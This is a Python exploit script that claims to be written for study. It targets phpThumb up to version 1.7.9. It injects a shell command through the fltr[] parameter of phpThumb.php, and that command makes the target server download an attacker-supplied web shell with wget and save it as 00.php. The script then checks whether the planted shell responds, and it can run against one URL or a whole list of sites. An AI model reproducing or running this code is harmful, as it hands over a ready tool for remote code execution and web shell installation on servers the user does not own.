try:
	import requests as r
except:
	print(" \nInstall requests lib")
	exit()
import argparse, os, sys
os.system("cls || clear")
banner = """ 

 /$$                                    
| $$                                    
| $$       /$$   /$$ /$$$$$$$   /$$$$$$ 
| $$      | $$  | $$| $$__  $$ |____  $$ 
| $$      | $$  | $$| $$  \ $$  /$$$$$$$ 
| $$      | $$  | $$| $$  | $$ /$$__  $$	
| $$$$$$$$|  $$$$$$/| $$  | $$|  $$$$$$$  
|________/ \______/ |__/  |__/ \_______/  
                                         
► phpThumb version <= 1.7.9 (RCE)
► Automatic file upload                                    
► Coded 4Study by: Brndsk 
► Github: github.com/brndsk

► Use: xpl.py --shell http://www.site.co/shell.txt --url http:/vuln.com/phpThumb/
► Use: xpl.py --shell http://www.site.co/shell.txt --list list.txt
"""
print(banner)
parser = argparse.ArgumentParser()
parser.add_argument("--shell", action="store", help='File\n', required = True)
parser.add_argument("--url", action="store", help='To exploit one website\n')
parser.add_argument("--list", action="store", help='To exploit list of websites')
argument = parser.parse_args()
shelltxt = sys.argv[2]
up = f"phpThumb.php?src=file.jpg&fltr[]=blur|9 -quality 75 -interlace line fail.jpg jpeg:fail.jpg;wget {shelltxt} -O 00.php;&phpThumbDebug=9"
uploaded = '00.php'
def func_url():
	site = sys.argv[4]
	uploading = r.get(site+up)
	exploited = r.get(site+uploaded)
	if uploading.status_code == 200:
		if exploited.status_code == 200:
			print(f' \n [+] ► Check!: {site+uploaded} \n')
		else:
			print(f" \n [-] Not vulnerable: {site}")
	else:
		print(f" \n [-] Not vulnerable: {site}")
if argument.url:
	func_url()
def func_list():
	txt = sys.argv[4]
	read_file = open(txt, 'r', encoding='utf-8', errors='ignore').readlines()
	read = open('list.txt', 'r')
	for lista in read:
		a = lista.rstrip('\n')
		b = up.rstrip('\n')
		c = uploaded.rstrip('\n')
		site = a+b
		site = site.strip('\n')
		upload = r.get(site)
		exploited = a+c
		exploited_r = r.get(exploited)
		if exploited_r.status_code == 200:
			print(f" \n [+] ► Check!: {exploited}")
		else:
			print(f"[-] Not Vulnerable: {lista}")	
if argument.list:
	func_list()



	

	
